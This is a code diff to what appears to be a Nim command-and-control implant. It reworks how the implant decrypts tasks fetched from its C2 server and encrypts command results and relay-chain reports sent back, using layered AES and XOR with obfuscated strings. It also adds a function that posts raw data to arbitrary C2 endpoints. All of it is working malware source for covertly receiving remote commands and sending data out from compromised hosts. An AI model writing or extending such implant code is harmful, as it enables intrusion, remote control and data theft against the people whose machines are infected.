@@ -444,8 +444,21 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
             
             # Check if the response has the expected "t" key for encrypted task data
             if responseJson.hasKey("t"):
-                # Attempt to parse task (parseJson() needs string literal... sigh)
-                var responseData = decryptData(responseJson["t"].getStr(), li.UNIQUE_XOR_KEY) #.replace("\'", "\\\"")
+                # Auto-detect role for debug purposes
+                let myRole = when defined(RELAY_ADDRESS): "RELAY_CLIENT" else: "STANDARD"
+                
+                # UNIFIED LAYERED DECRYPTION: XOR → AES for ALL implants
+                when defined verbose:
+                    echo obf("DEBUG: getQueuedCommand() using layered decryption (XOR → AES) for ") & myRole
+                
+                # Step 1: XOR decrypt (envelope layer)
+                let encryptedTask = responseJson["t"].getStr()
+                let taskBytes = base64.decode(encryptedTask)
+                let xorDecrypted = xorString(taskBytes, INITIAL_XOR_KEY)
+                let aesInput = base64.encode(xorDecrypted)
+                
+                # Step 2: AES decrypt (content layer)
+                var responseData = decryptData(aesInput, li.UNIQUE_XOR_KEY)
                 
                 when defined verbose:
                     echo obf("DEBUG: getQueuedCommand() decrypted response data: ") & responseData
@@ -493,7 +506,21 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
 # Return command results via POST request to the result path
 proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : void =
     var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
-    discard doRequest(li, li.resultPath, "data", encryptData(data, li.UNIQUE_XOR_KEY), "post")
+    
+    # Auto-detect role for debug purposes
+    let myRole = when defined(RELAY_ADDRESS): "RELAY_CLIENT" else: "STANDARD"
+    
+    # UNIFIED LAYERED ENCRYPTION: AES → XOR for ALL implants
+    when defined debug:
+        echo "[DEBUG] 📡 HTTP: Using layered encryption (AES → XOR) for " & myRole & " result"
+    
+    # Step 1: AES encrypt (content layer)
+    let aesEncrypted = encryptData(data, li.UNIQUE_XOR_KEY)
+    # Step 2: XOR encrypt (envelope layer)
+    let xorEncrypted = xorString(aesEncrypted, INITIAL_XOR_KEY)
+    let encryptedData = base64.encode(xorEncrypted)
+    
+    discard doRequest(li, li.resultPath, "data", encryptedData, "post")
 
 # postTopologyUpdate removed - using distributed chain relationships system
 
@@ -745,6 +772,22 @@ proc removeStoredImplantID() =
     except:
         discard
 
+# Send raw data to C2 server endpoint
+proc postRawData*(listener: Listener, endpoint: string, data: string) =
+    when defined debug:
+        echo "[HTTP] 📡 Sending raw data to C2 endpoint: " & endpoint
+        echo "[HTTP] 📡 Data length: " & $data.len
+    
+    try:
+        let response = doRequest(listener, endpoint, "data", data, "post")
+        when defined debug:
+            echo "[HTTP] 📡 Response code: " & $response.code
+            if response.code != 200:
+                echo "[HTTP] 📡 Response body: " & response.body
+    except Exception as e:
+        when defined debug:
+            echo "[HTTP] 📡 Error sending raw data: " & e.msg
+
 # Enhanced chain info reporting function for distributed relay system
 proc postChainInfo*(listener: Listener, myGuid: string, parentGuid: string = "", myRole: string = "STANDARD", listeningPort: int = 0) =
     try:
@@ -790,10 +833,22 @@ proc postChainInfo*(listener: Listener, myGuid: string, parentGuid: string = "",
         
         when defined debug:
             echo "[DEBUG] 📡 HTTP: Enhanced chain data: " & $chainData
-            echo "[DEBUG] 📡 HTTP: - Encrypting with UNIQUE key..."
+            echo "[DEBUG] 📡 HTTP: - Role: " & myRole
         
-        # Encrypt chain data using the same pattern as other endpoints
-        let encryptedData = encryptData($chainData, listener.UNIQUE_XOR_KEY)
+        # UNIFIED LAYERED ENCRYPTION: AES → XOR for ALL implants
+        when defined debug:
+            echo "[DEBUG] 📡 HTTP: - Using layered encryption (AES → XOR) for " & myRole
+            echo "[DEBUG] 📡 HTTP: - Step 1: AES encrypt with UNIQUE_KEY (content)"
+        
+        # Step 1: AES encrypt with UNIQUE_KEY (content layer)
+        let aesEncrypted = encryptData($chainData, listener.UNIQUE_XOR_KEY)
+        
+        when defined debug:
+            echo "[DEBUG] 📡 HTTP: - Step 2: XOR encrypt with INITIAL_XOR_KEY (envelope)"
+        
+        # Step 2: XOR encrypt with INITIAL_XOR_KEY (envelope layer)
+        let xorEncrypted = xorString(aesEncrypted, INITIAL_XOR_KEY)
+        let encryptedData = base64.encode(xorEncrypted)
         
         when defined debug:
             echo "[DEBUG] 📡 HTTP: - Encrypted data length: " & $encryptedData.len
